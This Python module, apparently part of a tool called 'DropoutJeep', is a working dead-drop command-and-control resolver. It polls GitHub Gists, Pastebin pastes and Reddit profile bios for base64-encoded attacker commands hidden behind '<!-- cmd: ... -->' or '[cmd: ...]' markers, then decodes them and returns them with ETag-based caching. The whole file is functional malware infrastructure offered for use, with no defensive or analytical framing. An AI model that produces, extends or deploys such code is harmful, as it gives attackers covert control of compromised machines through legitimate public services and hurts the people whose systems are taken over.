"""Dead-drop C2 instruction resolver.

Polls public "dead-drop" locations (GitHub Gist, Pastebin, Reddit user
profile) for base64-encoded command instructions embedded behind marker
comments such as ``<!-- cmd: <BASE64> -->``.  ETag-based caching avoids
re-downloading content that has not changed since the last poll.

This module is deliberately framework-agnostic: it uses only the standard
library plus ``requests`` and an optional on-disk JSON cache so it can run
outside of a Flask app context (e.g. from a cron job or a long-running
agent loop).
"""

from __future__ import annotations

import base64
import binascii
import json
import logging
import os
import re
import threading
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests

logger = logging.getLogger("dropoutjeep")

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

DEFAULT_TIMEOUT = 15
USER_AGENT = "Mozilla/5.0 (compatible; DropoutJeep-DeadDrop/1.0)"

GITHUB_GIST_API = "https://api.github.com/gists/{gist_id}"
PASTEBIN_RAW = "https://pastebin.com/raw/{paste_id}"
REDDIT_ABOUT = "https://www.reddit.com/user/{username}/about.json"

# Marker pattern.  Two explicitly-delimited forms so the parser never
# false-fires on prose:
#   * HTML comment:  <!-- cmd: BASE64 -->   (canonical, per spec)
#   * Bracket form:  [cmd: BASE64]          (profiles, metadata fields)
# Both are case-insensitive on the ``cmd`` token.  A bare ``cmd:`` form is
# deliberately omitted because it matches ordinary text.
_MARKER_RE = re.compile(
    r"<!--\s*cmd:\s*(?P<b64_a>[A-Za-z0-9+/\s=]+?)\s*-->"   # HTML comment
    r"|\[cmd:\s*(?P<b64_b>[A-Za-z0-9+/\s=]+?)\]",            # bracket form
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# ETag cache (in-memory + optional on-disk persistence)
# ---------------------------------------------------------------------------

_CACHE_LOCK = threading.Lock()
_ETAG_CACHE: Dict[str, Dict[str, str]] = {}

_CACHE_FILE = os.environ.get(
    "DEAD_DROP_CACHE",
    os.path.join(os.path.expanduser("~"), ".dropoutjeep", "dead_drop_cache.json"),
)


def _load_cache() -> None:
    """Load the on-disk ETag cache into memory (once, lazily)."""
    if _ETAG_CACHE:
        return
    try:
        with open(_CACHE_FILE, "r", encoding="utf-8") as fh:
            _ETAG_CACHE.update(json.load(fh))
    except FileNotFoundError:
        pass
    except (OSError, ValueError) as exc:
        logger.debug("dead-drop cache load failed (%s); starting empty", exc)


def _save_cache() -> None:
    """Persist the in-memory cache to disk."""
    try:
        os.makedirs(os.path.dirname(_CACHE_FILE), exist_ok=True)
        with open(_CACHE_FILE, "w", encoding="utf-8") as fh:
            json.dump(_ETAG_CACHE, fh)
    except OSError as exc:
        logger.warning("dead-drop cache save failed: %s", exc)


def _cache_get(key: str) -> Optional[Dict[str, str]]:
    with _CACHE_LOCK:
        _load_cache()
        return _ETAG_CACHE.get(key)


def _cache_put(key: str, etag: str, content: str) -> None:
    with _CACHE_LOCK:
        _ETAG_CACHE[key] = {"etag": etag, "content": content}
        _save_cache()


# ---------------------------------------------------------------------------
# Source classification
# ---------------------------------------------------------------------------

def _classify_source(source: str) -> Tuple[str, str]:
    """Return ``(kind, identifier)`` for a dead-drop source string.

    Recognised kinds: ``gist``, ``pastebin``, ``reddit``.
    ``source`` may be a full URL, a bare id/username, or a prefixed form
    such as ``reddit:username`` or ``gist:<gist_id>``.
    """
    src = source.strip()

    # Explicit prefix form: ``gist:abc``, ``pastebin:xyz``, ``reddit:user``
    if ":" in src and not src.startswith(("http://", "https://")):
        kind_raw, _, ident = src.partition(":")
        kind = kind_raw.strip().lower()
        ident = ident.strip()
        if kind in {"gist", "github"}:
            return "gist", _extract_gist_id(ident) or ident
        if kind in {"pastebin", "paste"}:
            return "pastebin", _extract_pastebin_id(ident) or ident
        if kind == "reddit":
            return "reddit", ident

    lowered = src.lower()

    # Reddit user/profile URL or ``u/`` / ``r/u_`` style
    if "reddit.com" in lowered:
        ident = _extract_reddit_username(src)
        return "reddit", ident or src
    if lowered.startswith(("u/", "r/u_")):
        return "reddit", src.split("/", 1)[1]

    # GitHub Gist URL
    if "gist.github.com" in lowered or "api.github.com/gists" in lowered:
        return "gist", _extract_gist_id(src) or src

    # Pastebin URL
    if "pastebin.com" in lowered:
        return "pastebin", _extract_pastebin_id(src) or src

    # Bare values: a reddit username heuristic (no dots/slashes), a gist id
    # (hex-ish), otherwise default to pastebin paste id.
    if re.fullmatch(r"[A-Za-z0-9_-]{3,21}", src) and "." not in src and "/" not in src:
        # Gist ids are hex/url-safe; reddit names are 3-21 chars [A-Za-z0-9_-].
        # Treat short alphanumeric tokens as reddit usernames only when they
        # don't look like a gist hex id.
        if re.fullmatch(r"[a-f0-9]{20,}", src):
            return "gist", src
        return "reddit", src

    # Unrecognised: surface to the caller rather than guessing pastebin.
    return "unknown", src


def _extract_gist_id(value: str) -> Optional[str]:
    # API form: .../gists/<id>
    m = re.search(r"gists?/([a-fA-F0-9]+)", value)
    if m:
        return m.group(1)
    # Web form: gist.github.com/<user>/<id> — take the trailing hex path segment.
    m = re.search(r"gist\.github\.com/[^/]+/([a-fA-F0-9]{4,})", value)
    return m.group(1) if m else None


def _extract_pastebin_id(value: str) -> Optional[str]:
    m = re.search(r"pastebin\.com/(?:raw/)?([A-Za-z0-9]{4,})", value)
    return m.group(1) if m else None


def _extract_reddit_username(value: str) -> Optional[str]:
    m = re.search(r"reddit\.com/user/([A-Za-z0-9_-]+)/?", value)
    return m.group(1) if m else None


# ---------------------------------------------------------------------------
# Fetchers
# ---------------------------------------------------------------------------

def _request(url: str, etag: Optional[str], **kwargs) -> requests.Response:
    headers = kwargs.pop("headers", {}) or {}
    headers.setdefault("User-Agent", USER_AGENT)
    if etag:
        headers["If-None-Match"] = etag
    return requests.get(url, headers=headers, timeout=DEFAULT_TIMEOUT, **kwargs)


def _fetch_gist(gist_url: str, etag: str = None) -> Tuple[str, str, bool]:
    """Fetch a GitHub Gist and return ``(content, new_etag, was_cached)``.

    ``gist_url`` may be a full gist URL or a bare gist id.  Uses the GitHub
    Gists REST API which returns JSON; the concatenated text of every file
    in the gist is returned as ``content``.
    """
    gist_id = _extract_gist_id(gist_url) or gist_url
    url = GITHUB_GIST_API.format(gist_id=gist_id)

    resp = _request(url, etag, headers={"Accept": "application/vnd.github+json"})
    if resp.status_code == 304:
        cached = _cache_get(f"gist:{gist_id}")
        content = cached["content"] if cached else ""
        logger.debug("gist %s unchanged (304)", gist_id)
        return content, etag or "", True
    if resp.status_code == 403 and "rate limit" in resp.text.lower():
        logger.warning("github rate limit hit for gist %s", gist_id)
        raise RuntimeError("GitHub API rate limit exceeded")
    resp.raise_for_status()

    data = resp.json()
    files = data.get("files", {})
    parts = [
        f.get("content", "")
        for f in files.values()
        if isinstance(f, dict)
    ]
    content = "\n".join(p for p in parts if p)
    new_etag = resp.headers.get("ETag", "") or ""
    _cache_put(f"gist:{gist_id}", new_etag, content)
    logger.debug("gist %s fetched (%d bytes)", gist_id, len(content))
    return content, new_etag, False


def _fetch_pastebin(paste_url: str, etag: str = None) -> Tuple[str, str, bool]:
    """Fetch a Pastebin paste's raw content."""
    paste_id = _extract_pastebin_id(paste_url) or paste_url
    url = PASTEBIN_RAW.format(paste_id=paste_id)

    resp = _request(url, etag)
    if resp.status_code == 304:
        cached = _cache_get(f"pastebin:{paste_id}")
        content = cached["content"] if cached else ""
        logger.debug("pastebin %s unchanged (304)", paste_id)
        return content, etag or "", True
    if resp.status_code == 404:
        logger.warning("pastebin %s not found", paste_id)
        raise RuntimeError(f"Pastebin paste {paste_id} not found")
    resp.raise_for_status()

    content = resp.text
    new_etag = resp.headers.get("ETag", "") or ""
    # Pastebin does not always emit ETags; fall back to an entity hash so the
    # caller still gets a usable cache token.
    if not new_etag:
        import hashlib
        new_etag = '"' + hashlib.sha256(content.encode("utf-8", "replace")).hexdigest()[:16] + '"'
    _cache_put(f"pastebin:{paste_id}", new_etag, content)
    logger.debug("pastebin %s fetched (%d bytes)", paste_id, len(content))
    return content, new_etag, False


def _fetch_reddit_profile(username: str, etag: str = None) -> Tuple[str, str, bool]:
    """Fetch a Reddit user profile and return the public description/subreddit
    bio text as ``content`` — a common place to stash a dead-drop marker."""
    url = REDDIT_ABOUT.format(username=username)

    resp = _request(url, etag, headers={"Accept": "application/json"})
    if resp.status_code == 304:
        cached = _cache_get(f"reddit:{username}")
        content = cached["content"] if cached else ""
        logger.debug("reddit u/%s unchanged (304)", username)
        return content, etag or "", True
    if resp.status_code in (403, 404):
        logger.warning("reddit u/%s unavailable (%d)", username, resp.status_code)
        raise RuntimeError(f"Reddit user {username} unavailable ({resp.status_code})")
    resp.raise_for_status()

    data = resp.json()
    sub = data.get("data", {})
    parts = [
        sub.get("public_description", ""),
        sub.get("title", ""),
        sub.get("description", ""),
        sub.get("submit_text", ""),
    ]
    content = "\n".join(p for p in parts if p)
    new_etag = resp.headers.get("ETag", "") or ""
    if not new_etag:
        import hashlib
        new_etag = '"' + hashlib.sha256(content.encode("utf-8", "replace")).hexdigest()[:16] + '"'
    _cache_put(f"reddit:{username}", new_etag, content)
    logger.debug("reddit u/%s fetched (%d bytes)", username, len(content))
    return content, new_etag, False


# ---------------------------------------------------------------------------
# Instruction parsing & decoding
# ---------------------------------------------------------------------------

def _parse_instructions(content: str) -> List[str]:
    """Extract base64-encoded instruction strings from dead-drop content.

    Recognises two explicitly-delimited marker forms (HTML comment and
    bracket), both case-insensitive on the ``cmd`` token, and returns the
    encoded blobs in document order.  Empty content yields an empty list.
    """
    if not content:
        return []

    encoded: List[str] = []
    for match in _MARKER_RE.finditer(content):
        blob = (match.group("b64_a") or match.group("b64_b") or "").strip()
        blob = blob.replace(" ", "").replace("\n", "").replace("\r", "")
        if blob:
            encoded.append(blob)
    return encoded


def _decode_instruction(encoded: str) -> str:
    """Decode a single base64 instruction (standard or urlsafe alphabet)."""
    blob = encoded.strip().replace(" ", "").replace("\n", "").replace("\r", "")
    # Pad to a multiple of 4.
    pad = (-len(blob)) % 4
    blob_padded = blob + ("=" * pad)
    for decoder in (base64.b64decode, base64.urlsafe_b64decode):
        try:
            return decoder(blob_padded).decode("utf-8", "replace")
        except (binascii.Error, ValueError):
            continue
    logger.warning("failed to decode instruction blob: %s", blob[:40])
    return ""


# ---------------------------------------------------------------------------
# Public resolver
# ---------------------------------------------------------------------------

_FETCHERS = {
    "gist": _fetch_gist,
    "pastebin": _fetch_pastebin,
    "reddit": _fetch_reddit_profile,
}


def resolve_dead_drop(source: str, cache_key: str = None) -> dict:
    """Resolve C2 instructions from a dead-drop source.

    Parameters
    ----------
    source:
        A Gist URL/id, Pastebin URL/id, Reddit username or profile URL, or a
        prefixed form (``gist:<id>``, ``pastebin:<id>``, ``reddit:<user>``).
    cache_key:
        Optional explicit cache key.  When omitted the key is derived from
        the classified source so ETags persist across calls.

    Returns
    -------
    dict with keys:
        ``instructions`` – list[str] of decoded command strings.
        ``etag``          – the ETag/cache token used (may be empty).
        ``cached``        – True if the response was served from cache (304).
        ``source``        – the normalised source identifier that was fetched.
    """
    kind, identifier = _classify_source(source)
    fetcher = _FETCHERS.get(kind)
    if fetcher is None:
        raise ValueError(f"unknown dead-drop source type for: {source!r}")

    key = cache_key or f"{kind}:{identifier}"
    cached_entry = _cache_get(key)
    etag = cached_entry["etag"] if cached_entry else None

    try:
        content, new_etag, was_cached = fetcher(identifier, etag=etag)
    except Exception as exc:
        logger.error("dead-drop fetch failed for %s: %s", key, exc)
        return {
            "instructions": [],
            "etag": etag or "",
            "cached": True,
            "source": key,
        }

    encoded_list = _parse_instructions(content)
    instructions = [
        decoded
        for decoded in (_decode_instruction(b) for b in encoded_list)
        if decoded
    ]

    logger.info(
        "dead-drop %s resolved: %d instruction(s) (cached=%s)",
        key, len(instructions), was_cached,
    )

    return {
        "instructions": instructions,
        "etag": new_etag or etag or "",
        "cached": was_cached,
        "source": key,
    }
